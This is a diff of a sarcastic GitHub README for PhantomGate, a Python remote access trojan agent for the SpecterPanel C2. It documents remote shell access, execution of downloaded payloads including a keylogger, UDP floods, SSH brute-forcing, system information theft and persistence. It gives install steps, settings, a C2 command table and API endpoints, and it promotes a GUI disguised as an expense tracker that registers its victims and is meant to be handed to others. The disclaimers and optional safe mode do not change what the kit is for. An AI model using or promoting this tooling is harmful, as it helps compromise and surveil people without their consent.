@@ -1,82 +1,75 @@
-# PhantomGate – because the world definitely needed another RAT
+# PhantomGate
 
 ![logo](12.jpg)
 
 ---
 
-## Behold. My Masterpiece.
+## Welcome To The Nightmare
 
-I spent countless sleepless nights crafting this beautiful disaster.  
-Blood, sweat, tears, and approximately 47 cups of coffee went into making this RAT.  
-You're welcome. Or I'm sorry. Honestly, I can't tell anymore.
+I built this because apparently the world needed another RAT.  
+48 cups of coffee, 12 existential crises, and one very confused cat later – here we are.  
+You're welcome. Or I'm sorry. Honestly, I've lost track.
 
 ---
 
-## The Fine Print (Read It Or Don't, I'm Not Your Mom)
+## The Rules (Read Them Or Regret It Later)
 
 This is for **educational use, authorised red teams, and your own lab only**.  
-If you run this on someone's machine without permission, that's illegal.  
-I'm not your lawyer. I'm not your alibi. I'm not even sure I'm a real person at this point.
+If you run this on someone's machine without permission, that's on you.  
+I'm not your lawyer. I'm not your alibi. I'm not even sure I'm a real person anymore.
 
-"I didn't know" won't work. You know. I know you know. Don't play dumb.
-
----
-
-## The Trojan Horse – Behold Its Terrible Beauty
-
-Look upon my works, ye mighty, and despair.
-
-Yes. There's a GUI. Real hackers use terminals. But some people like buttons. And colors. So I gave them what they wanted. A beautiful, seductive, utterly terrifying interface.
-
-**Behold:** [PhontomGate Flet App](https://github.com/omerKkemal/flet-apps/tree/main/PhontomGate)
-
-It looks so innocent. So helpful. So... corporate. Like something you'd install on your work computer to track expenses. The colors are calming. The layout is professional. It practically screams "legitimate business application."
-
-**That's the horror.**
-
-### The Beauty That Beckons:
-
-- **Elegance incarnate** – A work of art that happens to be a Trojan horse.
-- **Seductive simplicity** – Any fool can use it. That's the point. That's the trap.
-- **Cross-platform nightmare fuel** – Windows. Linux. Android. It follows everywhere.
-- **The perfect disguise** – It pretends to track expenses. It's tracking your everything.
-
-### The Horror That Lurks:
-
-- **It connects to a C2 server** – That button you clicked? It registered a target. That beautiful interface? It controls remote machines. Beautifully. Terrifyingly.
-- **It spreads like a plague** – Build it as APK, EXE, web app. Hand it to a friend. Watch it propagate. Like a flower that grows thorns. Like a smile that hides teeth.
-- **It pretends to be your friend** – It looks helpful. It looks innocent. You know. I know. We all know.
-- **That expense tracker?** – Yeah. That's tracking you. Every click. Every command. It's watching. It's waiting. And it's beautiful.
-
-**"What a lovely expense tracker!"** – You, 5 seconds before you realize it's tracking you.
-
-**The beauty makes you lower your guard. The horror makes you question everything.**
-
-*You didn't find it. It found you.*  
-*And it's absolutely stunning.*
+You've been warned. Multiple times. I'm done repeating myself.
 
 ---
 
-## So what does it do? (as if you couldn't guess)
+## The Pretty Mask – Because Terminals Are Scary
 
-PhantomGate is the agent side of the SpecterPanel C2.  
-It runs on Windows, Linux, and even Android (Termux – because apparently phones need botnets too).  
+Yes. There's a GUI. I know, I know – real hackers use terminals. But some people like buttons. And colors. So I made one.
+
+**Look at it:** [PhontomGate Flet App](https://github.com/omerKkemal/flet-apps/tree/main/PhontomGate)
+
+It looks harmless. It looks helpful. It looks like something you'd install on your work computer.  
+The colors are calming. The layout is professional. It screams "I am a legitimate application."
+
+**That's the joke. That's the horror.**
+
+### What You're Actually Looking At:
+
+- **A work of art** – That happens to be a Trojan horse.
+- **A trap for fools** – Anyone can use it. That's the point.
+- **A digital ghost** – Windows, Linux, Android. It follows everywhere.
+- **A beautiful lie** – It pretends to be helpful. It's tracking everything.
+
+### What It's Really Doing:
+
+- **Phoning home** – That button you clicked? It registered a target.
+- **Spreading like wildfire** – Build it as APK, EXE, web app. Hand it to someone. Watch it grow.
+- **Lying to your face** – It looks innocent. It's not.
+- **Watching you** – Every click. Every command. It's beautiful. It's terrifying.
+
+**"What a lovely expense tracker!"** – You, 5 seconds before you realize you're the one being tracked.
+
+---
+
+## What This Thing Actually Does
+
+PhantomGate is the agent that talks to SpecterPanel C2.  
+It runs on Windows, Linux, and Android (Termux – because apparently phones need love too).  
 Everything is encrypted with AES‑256 because sending plaintext is for amateurs.
 
-**What it does:**
+**The short version:**
 
-- **Remote Shell** – Execute commands on the target. Revolutionary, I know.
-- **Code Injection** – Download and run Python payloads from the C2.
-- **Botnet Simulation** – UDP floods, SSH brute-force – in safe mode, obviously.
-- **System Info** – Gather OS, hardware, IP (stalking 101).
-- **Cross-Platform** – Windows, Linux, Android – same code, same bugs, same tears.
+- Run commands remotely – like SSH, but with more Python
+- Inject code on the fly – because why not
+- Simulate botnets – UDP floods, SSH brute (in safe mode, obviously)
+- Steal system info – OS, hardware, IP (the stalker special)
+- Run as a service or with a GUI – your choice
 
-It's not magic – it's just Python with a lot of caffeine and questionable life choices.  
-Calm down. Don't act impressed.
+It's not magic. It's Python with a caffeine addiction.
 
 ---
 
-## How It Talks To The C2 (since you probably don't care)
+## How It Talks To The Mothership
 
 ```mermaid
 graph LR
@@ -90,26 +83,27 @@ graph LR
     style B fill:#10b981,stroke:#fff,stroke-width:2px,color:#fff
 ```
 
-Agent polls the server every few seconds, gets instructions, runs them, sends back the output.  
-Nothing fancy. It's not AI. It's not blockchain. It's just sockets.  
-Boring, reliable, old‑school sockets that actually work. Unlike my sleep schedule.
+Agent polls the server every few seconds. Gets instructions. Runs them. Sends output back.  
+Nothing fancy. Just sockets. Reliable old-school sockets that actually work.
 
 ---
 
-## What's In This Beautiful Disaster
+## Features That Almost Work
 
-- **C2 Integration** – Connects to SpecterPanel – because reinventing the wheel is for idiots.
-- **Remote Shell** – Run any command on the target, get output back. Revolutionary.
-- **Code Injection** – Download and execute Python payloads from the C2.
-- **Botnet Simulation** – UDP flood, SSH brute-force – in safe mode, obviously.
-- **Safe Mode** – No real damage – just logs what *would* happen. For grown-ups.
-- **SQLite Tracking** – Keeps state locally so you don't forget what you did.
-- **Cross-Platform** – Windows, Linux, Android – same code, same bugs, same tears.
-- **Flet GUI** – The Trojan horse – pretty interface for people who fear the terminal.
+| Feature | What It Actually Does |
+|---------|----------------------|
+| C2 Integration | Talks to SpecterPanel |
+| Remote Shell | Runs commands, returns output |
+| Code Injection | Downloads and executes Python payloads |
+| Botnet Simulation | UDP flood, SSH brute (safe mode available) |
+| Safe Mode | Logs what would happen (for grown-ups) |
+| SQLite Tracking | Keeps a local record (so you don't forget) |
+| Cross-Platform | Windows, Linux, Android – same bugs, same tears |
+| Flet GUI | The pretty mask (for the button-pushers) |
 
 ---
 
-## Architecture (the messy diagram nobody asked for)
+## The Architecture (It's A Mess)
 
 ```
                 ┌────────────────────────────────────────────────────┐
@@ -148,12 +142,11 @@ Boring, reliable, old‑school sockets that actually work. Unlike my sleep sched
                                   └─────────────┘
 ```
 
-Yes, I know the diagram is a bit extra. It's still useful. Stop complaining.  
-I spent like 10 minutes on this. Respect the effort.
+Yes, it's extra. No, I don't care.
 
 ---
 
-## Getting It Running (Without Breaking Things)
+## Getting It Running (Hopefully)
 
 ```bash
 git clone https://github.com/omerKkemal/PhantomGate.git
@@ -167,79 +160,74 @@ pip install -r requirements.txt
 # Edit setting.py – set your C2 URL and API token
 nano setting.py
 
-# Run headless (the cool way)
+# Run it headless (the cool way)
 python PhantomGate.py
 
 # Or with GUI (the button-pusher way)
 python main.py
 ```
 
-### Quick install scripts (if you're lazy)
+### Quick Install (For The Lazy)
 
-- Linux/macOS: `chmod +x install.sh && ./install.sh` – because you can't figure out chmod
-- Windows: just double‑click `install.bat` – congrats, you clicked a button
+- Linux/macOS: `chmod +x install.sh && ./install.sh`
+- Windows: double-click `install.bat` – you can do it
 
 ---
 
-## Configuration – setting.py explained (read it or cry later)
-
-You only need to touch a few things. Here's the important stuff. Pay attention. Or don't. I'm not your boss.
+## The Settings (Don't Screw This Up)
 
 ```python
 class Setting:
     def __init__(self):
-        # CHANGE THIS – 16 bytes, keep it secret. Seriously.
+        # CHANGE THIS – 16 bytes. Keep it secret.
         self.ENCRYPTION_KEY = b'your-16-byte-key-here'
         
-        # Where's your SpecterPanel? (don't use localhost for real ops, genius)
+        # Where's your SpecterPanel?
         self.url = 'http://127.0.0.1:5000'
-        # API token from SpecterPanel settings (get it yourself)
+        # API token from SpecterPanel
         self.API_TOKEN = 'your-api-token-here'
         
-        # UDP flood targets (ports) – because you'll totally use this responsibly
+        # UDP flood ports
         self.PORT = [80, 443, 8080, 22, 3389, 53, 123]
         
-        # How often to poll the C2 (seconds) – don't set it too low, idiot
+        # Polling interval (seconds)
         self.MAIN_LOOP_DELAY = 5
         
-        # Safe mode – set to True if you don't want to go to jail
-        # self.SAFE_MODE = True   # uncomment this, you coward
+        # Safe mode – uncomment if you like freedom
+        # self.SAFE_MODE = True
 ```
 
-Most of the other knobs you can leave alone unless you're tweaking performance – which you probably shouldn't because you'll break something.
+---
+
+## Commands You Can Send (The Fun Part)
+
+| Command | What It Does | Example |
+|---------|--------------|---------|
+| `sys_info` | Get OS, hardware, IP | `sys_info` |
+| `db_info` | Show local DB stats | `db_info` |
+| `bot start udp` | Start UDP flood | `bot start udp_1` |
+| `bot start brut` | Start SSH brute | `bot start brut_1` |
+| `bot stop <id>` | Stop a thread | `bot stop udp_1` |
+| `shell <cmd>` | Run shell command | `shell ls -la` |
+| `code exec <name>` | Run injected payload | `code exec keylogger` |
 
 ---
 
-## Commands You Can Send From The C2 (the fun part)
+## API Endpoints (For The Nerds)
 
-| Command | What it does (badly) | Example |
-|---------|----------------------|---------|
-| `sys_info` | Gather OS, hardware, IP (stalking 101) | `sys_info` |
-| `db_info` | Show local DB stats (how exciting) | `db_info` |
-| `bot start udp` | Start UDP flood – don't say I didn't warn you | `bot start udp_1` |
-| `bot start brut` | Start SSH brute‑force (so original) | `bot start brut_1` |
-| `bot stop <id>` | Stop a thread (because you changed your mind) | `bot stop udp_1` |
-| `shell <cmd>` | Run any shell command (the actually useful one) | `shell ls -la` |
-| `code exec <name>` | Run an injected payload (for the script kiddies) | `code exec keylogger` |
-
----
-
-## The API Endpoints (For The Nerds)
-
-The agent calls these on the SpecterPanel server. All traffic is encrypted with AES‑256‑EAX.  
-If you send plaintext, the server will ignore you. As it should. Security isn't optional.
+All traffic is encrypted with AES‑256‑EAX. Send plaintext and get ignored.
 
 | Endpoint | Method | When |
 |----------|--------|------|
-| `/api/v1.2/register_target` | POST | Once at start |
+| `/api/v1.2/register_target` | POST | Startup |
 | `/api/v1.2/ApiCommand/<target>` | GET | Every poll |
-| `/api/v1.2/Apicommand/save_output` | POST | After each command |
+| `/api/v1.2/Apicommand/save_output` | POST | After commands |
 | `/api/v1.2/BotNet/<target>` | GET | Every poll |
 | `/api/v1.2/get_instruction/<target>` | GET | Every poll |
-| `/api/v1.2/injection/<target>` | GET | When a payload is requested |
+| `/api/v1.2/injection/<target>` | GET | For payloads |
 | `/api/v1.2/injection_output_save` | POST | After injection |
 
-The encrypted wrapper looks like this (because you need a visual – I know how you are):
+Encrypted format:
 
 ```json
 {
@@ -249,124 +237,94 @@ The encrypted wrapper looks like this (because you need a visual – I know how 
 }
 ```
 
-Read it. Learn it. Love it. Or don't. I don't care.
-
 ---
 
-## Safe Mode – For The Responsible Adults Who Don't Want To Go To Jail
+## Safe Mode – For The Responsible Ones
 
-Enable safe mode, and the agent will log what it *would* do without actually doing it.  
-It's like a "dry run" for people who don't want to be featured on the evening news.
+Enable it. Use it. Don't go to jail.
 
-### How to enable
+| Action | Normal | Safe |
+|--------|--------|------|
+| UDP flood | Sends packets | Logs "would send" |
+| SSH brute | Real attempts | Simulates |
+| File writes | Creates files | Logs operation |
+| Registry changes | Writes | Read-only |
+| Persistence | Installs | Logs |
 
-```bash
-# environment variable (if you hate editing files)
-export PHANTOMGATE_SAFE_MODE=1
-python PhantomGate.py
-
-# or command line (for the fancy people)
-python PhantomGate.py --safe-mode
-
-# or just set SAFE_MODE = True in the code (if you're not scared)
-```
-
-### What changes (because you'll ask anyway – you always do)
-
-| Action | Normal mode | Safe mode |
-|--------|-------------|-----------|
-| UDP flood | Actually sends packets (bad) | Logs "would send X packets" (good) |
-| SSH brute | Real login attempts (illegal) | Simulates attempts, no network (legal) |
-| File writes | Creates/modifies files (risky) | Logs the operation (safe) |
-| Registry changes | Writes to registry (oops) | Read‑only, logs changes (whew) |
-| Persistence | Installs startup entries (annoying) | Logs what would be installed (polite) |
-
-Example safe mode log (so you can sleep at night):
+Example:
 
 ```
-[SAFE MODE] UDP flood prevented: would send 1000 packets to 192.168.1.100:80
+[SAFE MODE] UDP flood prevented: would send 1000 packets
 [SAFE MODE] File write prevented: would create C:\temp\output.txt
 ```
 
-Use it in labs. Don't be a hero. Nobody likes a hero. Heroes go to jail.
-
 ---
 
-## Where Does It Run? (spoiler: almost everywhere)
+## Where It Runs
 
 | Platform | Status | Notes |
 |----------|--------|-------|
-| Windows 10/11, Server | ✅ Full | cmd, PowerShell, registry persistence (the usual nonsense) |
-| Linux (Ubuntu, Debian, CentOS) | ✅ Full | bash, crontab, daemon mode (so stealthy, much hacker) |
-| Android (Termux) | ✅ Full | Limited shell, but hey, it works – good enough for a phone |
-| **Flet GUI (Trojan Horse)** | ✅ Full | [PhantomGate Flet App](https://github.com/omerKkemal/flet-apps/tree/main/PhontomGate) – the pretty mask |
-
-The agent auto‑detects the OS and adjusts accordingly.  
-Because even I don't want to maintain three separate codebases. I have a life. Sort of.
+| Windows 10/11, Server | ✅ | cmd, PowerShell, registry |
+| Linux (Ubuntu, Debian, CentOS) | ✅ | bash, crontab, daemon |
+| Android (Termux) | ✅ | Limited but works |
+| **Flet GUI** | ✅ | [Link](https://github.com/omerKkemal/flet-apps/tree/main/PhontomGate) |
 
 ---
 
-## The Dark Trio – Complete Ecosystem
+## The Dark Trio
 
-| Project | Description | Link |
-|---------|-------------|------|
-| **SpecterPanel** | The C2 server – the master of puppets | [GitHub](https://github.com/omerKkemal/oh-tool-v2) |
-| **PhantomGate** | The agent – the phantom itself | [GitHub](https://github.com/omerKkemal/PhontomGate) |
-| **PhontomGate GUI** | The Trojan horse – the pretty mask | [GitHub](https://github.com/omerKkemal/flet-apps/tree/main/PhontomGate) |
-
-Together they form a complete C2 ecosystem.  
-Or a three-headed monster. Depends on your perspective.
+| Project | Link |
+|---------|------|
+| **SpecterPanel** | [GitHub](https://github.com/omerKkemal/oh-tool-v2) |
+| **PhantomGate** | [GitHub](https://github.com/omerKkemal/PhontomGate) |
+| **PhontomGate GUI** | [GitHub](https://github.com/omerKkemal/flet-apps/tree/main/PhontomGate) |
 
 ---
 
-## Legal Stuff (because lawyers exist)
+## Legal Stuff
 
-You are allowed to use PhantomGate **only** for:
+You're allowed to use this for:
 
-- Authorised penetration tests (get it in writing – yes, actually)
-- Red team exercises in a controlled environment (not your grandma's PC)
-- Security research in an isolated lab (not the office network)
-- Learning how C2 frameworks work (because you're here to learn, right?)
+- Authorised pentests (get it in writing)
+- Red team exercises (controlled environment)
+- Security research (isolated lab)
+- Learning (you're here, right?)
 
-You are **not allowed** to:
+You're not allowed to:
 
-- Use it on systems you don't own or have permission to test (obviously)
-- Use it for criminal activity (really? I have to say this?)
-- Distribute modified versions for malicious purposes (don't be that guy)
-
-I've done my part. The rest is on you.  
-Don't make me come over there. I will. I know where you live.
+- Use it on random people
+- Use it for crime
+- Be that guy
 
 ---
 
-## Things I Know Are Broken (I'm honest about it)
+## Things I Broke (Honest)
 
-- SSH brute force is a bit janky (I know, I'll get to it)
-- The socket module is still a WIP
-- `mange_db.py` is still misspelled (I'll fix it someday)
-- VM detection is disabled because it was annoying everyone
-- Sometimes the logs are too verbose – deal with it
-- My sleep schedule is also broken – but that's not your problem
-
----
-
-## Contributing (you probably won't, but here goes)
-
-Found a bug? Want to add a feature? Go ahead. Impress me.
-
-1. Fork the repo
-2. Create a branch (`git checkout -b feature/awesome`)
-3. Commit your changes (test your code, for once)
-4. Push and open a PR (I'll probably merge it if it's not terrible)
-
-Please don't remove safe mode or add destructive features – that's not what this is for.  
-This is for learning, not for being a jerk. Read the room.
+- SSH brute is janky
+- Socket module is a WIP
+- `mange_db.py` is misspelled
+- VM detection is disabled
+- Logs are too verbose
+- My sleep schedule is ruined
 
 ---
 
-## Who Made This Beautiful Horror
+## Contributing
 
-**Omer Kemal** – Security Researcher, Developer, Caffeine Addict, Questionable Life Choices.
+Go ahead. Impress me.
+
+1. Fork it
+2. Branch it (`git checkout -b feature/awesome`)
+3. Commit it (test your code)
+4. PR it
+
+Don't remove safe mode. That's not cool.
+
+---
+
+## Who Made This
+
+**Omer Kemal** – Developer, caffeine addict, regret-haver.
 
 - [SpecterPanel](https://github.com/omerKkemal/oh-tool-v2)
 - [PhantomGate](https://github.com/omerKkemal/PhontomGate)
@@ -374,20 +332,16 @@ This is for learning, not for being a jerk. Read the room.
 
 ---
 
-## The Legal Bit
+## License
 
-It's mine. Don't steal it. Don't misuse it. Be a decent human.
+Educational and research use only. No warranty. No liability.
 
 ---
 
 <p align="center">
-  <sub>Behold. My masterpiece. Now go forth and cause beautiful chaos.</sub>
+  <sub>Built with spite. Powered by sarcasm. Sustained by coffee.</sub>
   <br>
-  <sub>Built with coffee. Fueled by sarcasm. Supported by pure spite.</sub>
-  <br>
-  <sub>No warranty. No promises. No refunds. No regrets.</sub>
+  <sub>No refunds. No regrets. No sleep.</sub>
   <br>
   <sub>Go outside. Touch grass. Or don't. I'm not your mom.</sub>
-  <br>
-  <sub>Actually, maybe go outside. It's nice out there. I should probably take my own advice.</sub>
 </p>
